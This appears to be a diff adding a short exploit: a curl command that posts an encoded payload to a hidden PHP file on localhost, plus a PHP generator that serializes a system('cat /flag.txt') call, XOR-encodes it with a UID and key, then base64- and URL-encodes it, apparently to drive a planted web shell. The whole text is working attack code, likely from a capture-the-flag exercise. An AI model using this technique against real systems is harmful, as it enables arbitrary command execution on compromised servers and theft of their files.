@@ -1,0 +1,27 @@
+curl --data "a=OT5mOn9xamp2IWVsJXcmaDZldns8NTQtMDQ1Onw1N2M%2BLTRrPDZ4OGAzMXV4NWFlN3pmNjwyLWAna3N2ZG0mYnNsIT9pOiI9ej8mOjU4cjxuOHc9NXhvcHYqPy1gPShuNjZwI34xPmQ%2FLnQgLCZ8OyY5LQ%3D%3D" 127.0.0.1/.sbnbjius.php
+
+Payload generator:
+<?php
+function xor_operation($str1, $str2) {
+    $result = "";
+    for ( $i=0; $i<strlen($str1); ) {
+        for ( $j=0; $j<strlen($str2) && $i<strlen($str1); $j++,$i++ ) {
+            $result .= chr( ord($str1[$i]) ^ ord($str2[$j]) );
+        }
+    }
+    return $result;
+}
+
+$UID = "9e4aec19-beff-43d2-8d1a-46eb063d9aa9";
+
+$value = Array(
+  'ak' => $UID,
+  'a' => 'e',
+  'd' => 'system("cat /flag.txt");',
+);
+
+$command = serialize ($value);
+$key = 'a';
+
+$to_send = base64_encode(xor_operation( xor_operation($command, $UID), $key));
+echo urlencode($to_send);
